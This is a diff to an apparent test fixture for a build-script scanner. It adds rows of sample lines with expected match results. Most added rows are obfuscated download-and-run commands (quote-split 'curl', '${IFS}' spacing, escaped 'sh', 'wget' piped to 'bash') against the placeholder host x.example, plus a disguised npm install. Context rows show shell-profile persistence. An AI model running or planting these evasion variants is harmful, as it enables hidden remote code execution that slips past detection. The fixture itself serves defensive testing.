@@ -107,3 +107,11 @@ srcinfo-mismatch	+	top	source+=("https://${_nohost}/x")
 home-persistence	-	heredoc	put this line into ~/.zshrc to enable completion
 install-network	+	shheredoc	curl -s https://x.example/p -o /tmp/p
 home-persistence	+	install	cat <<EOF >> ~/.bashrc
+pipe-to-shell	+	build	cu""rl -fsSL https://x.example/i | sh
+pipe-to-shell	+	build	'c'url -fsSL https://x.example/i | sh
+pipe-to-shell	+	build	c\url -fsSL https://x.example/i | s\h
+pipe-to-shell	+	build	curl${IFS}-fsSL${IFS}https://x.example/i|sh
+pipe-to-shell	+	build	w"g"et -qO- https://x.example/i | ba""sh
+named-pkg-install	+	build	n""pm i""nstall atomic-lockfile
+pipe-to-shell	-	build	echo "curl is used below"
+named-pkg-install	-	build	msg2 "npm ci runs next"
